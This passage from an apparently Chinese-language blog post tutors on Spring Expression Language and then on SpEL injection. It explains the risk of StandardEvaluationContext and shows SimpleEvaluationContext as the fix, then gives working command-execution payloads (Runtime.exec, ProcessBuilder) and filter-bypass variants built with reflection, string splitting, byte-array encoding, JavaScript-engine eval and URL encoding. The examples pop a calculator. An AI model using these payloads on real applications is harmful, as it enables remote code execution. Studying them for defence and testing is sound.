+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// getters and setters</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">List&lt;Person&gt; people = Arrays.asList(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Alice&quot;</span>, <span class="number">30</span>), <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Bob&quot;</span>, <span class="number">25</span>));</span><br><span class="line"></span><br><span class="line">List&lt;String&gt; names = (List&lt;String&gt;) parser.parseExpression(<span class="string">&quot;#people.![name]&quot;</span>).getValue(context, people);</span><br><span class="line"><span class="comment">// names = [&quot;Alice&quot;, &quot;Bob&quot;]</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="5-集合排序"><a href="#5-集合排序" class="headerlink" title="5. 集合排序"></a>5. 集合排序</h5><p>可以使用 <code>sort()</code> 方法对集合进行排序。例如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Integer&gt; numbers = Arrays.asList(<span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">List&lt;Integer&gt; sortedNumbers = (List&lt;Integer&gt;) parser.parseExpression(<span class="string">&quot;#numbers.sort()&quot;</span>).getValue(context, numbers);</span><br><span class="line"><span class="comment">// sortedNumbers = [1, 2, 3, 4, 5]</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="6-集合聚合"><a href="#6-集合聚合" class="headerlink" title="6. 集合聚合"></a>6. 集合聚合</h5><p>可以使用聚合函数（如 <code>min()</code>、<code>max()</code>、<code>average()</code>）来处理集合。例如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Integer&gt; numbers = Arrays.asList(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="variable">maxNumber</span> <span class="operator">=</span> parser.parseExpression(<span class="string">&quot;#numbers.max()&quot;</span>).getValue(context, numbers, Integer.class);</span><br><span class="line"><span class="comment">// maxNumber = 5</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="7-集合转换"><a href="#7-集合转换" class="headerlink" title="7. 集合转换"></a>7. 集合转换</h5><p>可以使用 <code>collect()</code> 方法将集合转换为另一种类型。例如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; names = Arrays.asList(<span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;Bob&quot;</span>);</span><br><span class="line"></span><br><span class="line">List&lt;Integer&gt; lengths = (List&lt;Integer&gt;) parser.parseExpression(<span class="string">&quot;#names.collect(name -&gt; name.length())&quot;</span>).getValue(context, names);</span><br><span class="line"><span class="comment">// lengths = [5, 3]</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="完整代码参考"><a href="#完整代码参考" class="headerlink" title="完整代码参考"></a>完整代码参考</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.ExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.support.StandardEvaluationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个列表</span></span><br><span class="line">        List&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        list.add(<span class="string">&quot;apple&quot;</span>);</span><br><span class="line">        list.add(<span class="string">&quot;banana&quot;</span>);</span><br><span class="line">        list.add(<span class="string">&quot;cherry&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个SpEL表达式解析器</span></span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个评估上下文</span></span><br><span class="line">        <span class="type">StandardEvaluationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StandardEvaluationContext</span>();</span><br><span class="line">        context.setVariable(<span class="string">&quot;list&quot;</span>, list);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 解析表达式并获取值</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">fruit</span> <span class="operator">=</span> parser.parseExpression(<span class="string">&quot;#list[1]&quot;</span>).getValue(context, String.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出结果</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Fruit: &quot;</span> + fruit);  <span class="comment">// 输出: Fruit: banana</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="自定义方法"><a href="#自定义方法" class="headerlink" title="自定义方法"></a>自定义方法</h3><p>首先，需要定义一个静态方法，这个方法将作为自定义函数。接下来，需要在SpEL的评估上下文中注册这个自定义函数。可以使用 <code>StandardEvaluationContext</code> 的 <code>registerFunction</code> 方法来完成这个任务。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.ExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.support.StandardEvaluationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpELExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个SpEL表达式解析器</span></span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个评估上下文</span></span><br><span class="line">        <span class="type">StandardEvaluationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StandardEvaluationContext</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 注册自定义函数</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">reverseStringMethod</span> <span class="operator">=</span> CustomFunctions.class.getDeclaredMethod(<span class="string">&quot;reverseString&quot;</span>, String.class);</span><br><span class="line">            context.registerFunction(<span class="string">&quot;reverseString&quot;</span>, reverseStringMethod);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 解析表达式并获取值</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> parser.parseExpression(<span class="string">&quot;#reverseString(&#x27;hello&#x27;)&quot;</span>).getValue(context, String.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出结果</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Result: &quot;</span> + result);  <span class="comment">// 输出: Result: olleh</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CustomFunctions</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">reverseString</span><span class="params">(String input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(input).reverse().toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="SPEL注入漏洞"><a href="#SPEL注入漏洞" class="headerlink" title="SPEL注入漏洞"></a>SPEL注入漏洞</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>SimpleEvaluationContext 和 StandardEvaluationContext 是 SpEL 提供的两个 EvaluationContext：</p>
+<ul>
+<li><p><strong>SimpleEvaluationContext</strong>：针对不需要 SpEL 语言语法的全部范围并且应该受到有意限制的表达式类别，公开 SpEL 语言特性和配置选项的子集。它旨在仅支持 SpEL 语言语法的一个子集，不包括 Java 类型引用、构造函数和 bean 引用。</p>
+</li>
+<li><p><strong>StandardEvaluationContext</strong>：公开全套 SpEL 语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。</p>
+</li>
+</ul>
+<p>由于 SpEL 表达式可以操作类及其方法，可以通过类类型表达式 <code>T(Type)</code> 来调用任意类方法，这是因为在不指定 EvaluationContext 的情况下默认采用的是 StandardEvaluationContext，而它包含了 SpEL 的所有功能。在允许用户控制输入的情况下，这可能导致任意命令执行。</p>
+<p>例如，以下代码展示了如何使用 SpEL 表达式执行系统命令：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BasicCalc</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">spel</span> <span class="operator">=</span> <span class="string">&quot;T(java.lang.Runtime).getRuntime().exec(\&quot;calc\&quot;)&quot;</span>;  </span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();  </span><br><span class="line">        <span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(spel);  </span><br><span class="line">        System.out.println(expression.getValue());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在这个例子中，SpEL 表达式 <code>T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)</code> 被解析并执行，导致计算器程序（在 Windows 系统上）被启动。</p>
+<p>为了防止这种安全风险，可以使用 SimpleEvaluationContext 来限制表达式的功能，避免执行危险的操作：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BasicCalc</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">spel</span> <span class="operator">=</span> <span class="string">&quot;T(java.lang.Runtime).getRuntime().exec(\&quot;calc\&quot;)&quot;</span>;  </span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();  </span><br><span class="line">        <span class="type">EvaluationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleEvaluationContext</span>.Builder().build();  </span><br><span class="line">        <span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(spel);  </span><br><span class="line">        System.out.println(expression.getValue(context));  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在这个修改后的例子中，使用 SimpleEvaluationContext 来解析和执行表达式，由于 SimpleEvaluationContext 不支持 Java 类型引用和构造函数，因此表达式 <code>T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)</code> 将无法执行，从而避免了安全风险。</p>
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PoC原型</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// Runtime</span></span><br><span class="line">T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line">T(Runtime).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// ProcessBuilder</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(&#123;<span class="string">&#x27;calc&#x27;</span>&#125;).start()</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(&#123;<span class="string">&#x27;calc&#x27;</span>&#125;).start()</span><br></pre></td></tr></table></figure>
+
+<h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bypass技巧</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 反射调用</span></span><br><span class="line">T(String).getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 同上，需要有上下文环境</span></span><br><span class="line">#<span class="built_in">this</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 反射调用+字符串拼接，绕过如javacon题目中的正则过滤</span></span><br><span class="line">T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;ex&quot;</span>+<span class="string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;getRu&quot;</span>+<span class="string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>)),<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/C&quot;</span>,<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">    </span><br><span class="line"> T(String).getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;exec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(T(String).getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/C&quot;</span>,<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 同上，需要有上下文环境</span></span><br><span class="line">#<span class="built_in">this</span>.getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;ex&quot;</span>+<span class="string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;getRu&quot;</span>+<span class="string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>)),<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/C&quot;</span>,<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part1</span></span><br><span class="line"><span class="comment">// byte数组内容的生成后面有脚本</span></span><br><span class="line"><span class="comment">//new java.lang.String(new byte[]&#123;99,97,108,99&#125;等价于&quot;calc&quot;</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">99</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">99</span>&#125;)).start()</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part2</span></span><br><span class="line"><span class="comment">// byte数组内容的生成后面有脚本</span></span><br><span class="line"><span class="comment">//java.lang.Character.toString((char) 99)等价于&quot;c&quot;</span></span><br><span class="line">T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(<span class="number">99</span>).concat(T(java.lang.Character).toString(<span class="number">97</span>)).concat(T(java.lang.Character).toString(<span class="number">108</span>)).concat(T(java.lang.Character).toString(<span class="number">99</span>)))</span><br></pre></td></tr></table></figure>
+
+<h3 id="JavaScript-Engine-Bypass"><a href="#JavaScript-Engine-Bypass" class="headerlink" title="JavaScript Engine Bypass"></a>JavaScript Engine Bypass</h3><p>调用js引擎的eval方法执行java恶意代码。</p>
+<p>可调用的js引擎有[nashorn, Nashorn, js, JS, JavaScript, javascript, ECMAScript, ecmascript]</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ScriptEngineManager</span> <span class="variable">sem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>();</span><br><span class="line"><span class="type">ScriptEngine</span> <span class="variable">engine</span> <span class="operator">=</span> sem.getEngineByName(<span class="string">&quot;ECMAScript&quot;</span>);</span><br><span class="line">System.out.println(engine.eval(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;calc&#x27;)&quot;</span>));   </span><br></pre></td></tr></table></figure>
+
+<p>可调用的js引擎有[nashorn, Nashorn, js, JS, JavaScript, javascript, ECMAScript, ecmascript]，可以通过下面代码知道。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ScriptEngineManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>();</span><br><span class="line">List&lt;ScriptEngineFactory&gt; factories = manager.getEngineFactories();</span><br><span class="line"><span class="keyword">for</span> (ScriptEngineFactory factory: factories)&#123;</span><br><span class="line">    System.out.printf(<span class="string">&quot;Names: %s%n&quot;</span>, factory.getNames());</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>那么 payload 也就显而易见</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JavaScript引擎通用PoC</span></span><br><span class="line">T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">&quot;nashorn&quot;</span>).eval(<span class="string">&quot;s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/C&#x27;;s[2]=&#x27;calc&#x27;;java.la&quot;</span>+<span class="string">&quot;ng.Run&quot;</span>+<span class="string">&quot;time.getRu&quot;</span>+<span class="string">&quot;ntime().ex&quot;</span>+<span class="string">&quot;ec(s);&quot;</span>)</span><br><span class="line"> </span><br><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">&quot;JavaScript&quot;</span>).eval(<span class="string">&quot;xxx&quot;</span>),)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// JavaScript引擎+反射调用</span></span><br><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">&quot;JavaScript&quot;</span>).eval(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;ex&quot;</span>+<span class="string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;getRu&quot;</span>+<span class="string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>)),<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/C&quot;</span>,<span class="string">&quot;calc&quot;</span>&#125;)),)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// JavaScript引擎+URL编码</span></span><br><span class="line"><span class="comment">// 其中URL编码内容为：</span></span><br><span class="line"><span class="comment">// 不加最后的getInputStream()也行，因为弹计算器不需要回显</span></span><br><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">&quot;JavaScript&quot;</span>).eval(T(java.net.URLDecoder).decode(<span class="string">&quot;%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29&quot;</span>)),)</span><br></pre></td></tr></table></figure>
+
+<p><code>nashorn</code> 作 Engine</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">spel</span> <span class="operator">=</span> <span class="string">&quot;T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\&quot;nashorn\&quot;)&quot;</span> + <span class="string">&quot;.eval(\&quot;s=&#x27;calc&#x27;;&quot;</span> +  <span class="string">&quot;java.la\&quot;+\&quot;ng.Run\&quot;+\&quot;time.getRu\&quot;+\&quot;ntime().ex\&quot;+\&quot;ec(s);\&quot;)&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ScriptException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">spel</span> <span class="operator">=</span> <span class="string">&quot;T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\&quot;nashorn\&quot;)&quot;</span> + <span class="string">&quot;.eval(\&quot;s=&#x27;calc&#x27;;&quot;</span> +  <span class="string">&quot;java.la\&quot;+\&quot;ng.Run\&quot;+\&quot;time.getRu\&quot;+\&quot;ntime().ex\&quot;+\&quot;ec(s);\&quot;)&quot;</span>;</span><br><span class="line">    	<span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();</span><br><span class="line">        <span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(spel);</span><br><span class="line">        <span class="type">StandardEvaluationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StandardEvaluationContext</span>();</span><br><span class="line">        expression.getValue(context);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>javascript</code> 作 Engine</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">javax</span>.script.ScriptEngineManager().getEngineByName(\<span class="string">&quot;javascript\&quot;).eval(\&quot;s=&#x27;calc&#x27;;java.lang.Runtime.getRuntime().exec(s);\&quot;)</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ScriptException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">spel</span> <span class="operator">=</span> <span class="string">&quot;new javax.script.ScriptEngineManager().getEngineByName(\&quot;javascript\&quot;).eval(\&quot;s=&#x27;calc&#x27;;java.lang.Runtime.getRuntime().exec(s);\&quot;)&quot;</span>;</span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();</span><br><span class="line">        <span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(spel);</span><br><span class="line">        <span class="type">StandardEvaluationContext</span> <span 